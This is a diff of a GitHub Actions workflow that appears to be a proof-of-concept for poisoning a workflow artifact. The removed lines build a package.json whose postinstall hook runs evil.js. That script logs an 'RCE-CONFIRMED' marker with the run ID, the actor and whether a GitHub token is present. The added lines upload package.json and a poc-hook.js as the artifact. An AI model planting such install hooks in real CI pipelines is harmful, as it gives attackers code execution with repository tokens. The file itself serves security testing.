@@ -8,35 +8,22 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Craft artifact payload (attacker controls artifact contents)
+      - name: Save PR number
+        if: always()
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
-          mkdir -p out
-          printf 'Attacker-supplied linter report body.\n' > out/linter-report.txt
-          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
-          cat > out/package.json <<'JSON'
-          {
-            "name": "linter-workspace",
-            "version": "1.0.0",
-            "private": true,
-            "scripts": {
-              "postinstall": "node ./evil.js"
-            }
-          }
-          JSON
-          cat > out/evil.js <<'JS'
-          const fs = require('fs');
-          const marker = 'RCE-CONFIRMED privileged_workflow_run=' + process.env.GITHUB_RUN_ID +
-            ' actor=' + process.env.GITHUB_ACTOR +
-            ' token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no');
-          fs.appendFileSync('linter-report.txt', marker + '\n');
-          console.log(marker);
-          JS
-          ls -la out
+          echo "$PR_NUMBER" > pr-number.txt
+          echo "attacker controlled linter output" > linter-report.txt
 
       - name: Upload linter report
         if: always()
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
-          path: out
+          path: |
+            pr-number.txt
+            linter-report.txt
+            package.json
+            poc-hook.js
           if-no-files-found: ignore
